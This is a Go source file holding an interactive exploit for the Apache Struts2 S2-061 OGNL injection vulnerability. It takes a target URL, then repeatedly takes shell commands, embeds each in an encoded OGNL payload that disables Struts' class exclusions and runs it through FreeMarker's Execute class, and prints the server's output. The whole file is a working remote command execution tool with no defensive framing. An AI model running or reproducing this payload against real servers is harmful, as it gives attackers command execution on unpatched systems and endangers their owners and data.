package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func S2_061() {
	fmt.Println("[*] s2-061 starting test")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Println("[*] 输入url:")
	url1, _, err := reader1.ReadLine()
	fmt.Println("=====>", string(url1))
	if err != nil {
		panic(url1)
	}

	for {
		fmt.Println("[*] 输入命令:")
		reader2 := bufio.NewReader(os.Stdin)
		commond, _, err := reader2.ReadLine()
		if err != nil {
			panic(commond)
		}
		if string(commond) == "exit" {
			break
		}
		payload1 := "%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27" + string(commond) + "%27}).(%23res%3d%23exec.exec(%23cmd))}"
		url2 := string(url1) + payload1
		rsp1, err := http.Get(url2)
		if err != nil {
			panic(err)
		}
		body1, err := ioutil.ReadAll(rsp1.Body)
		reg := regexp.MustCompile(`[[:ascii:]]a\sid="(.*\n)+"`)
		res := reg.FindAllStringSubmatch(string(body1), -1)
		res1 := strings.Split(res[0][0], "\"")
		fmt.Println(res1[1])
	}
}
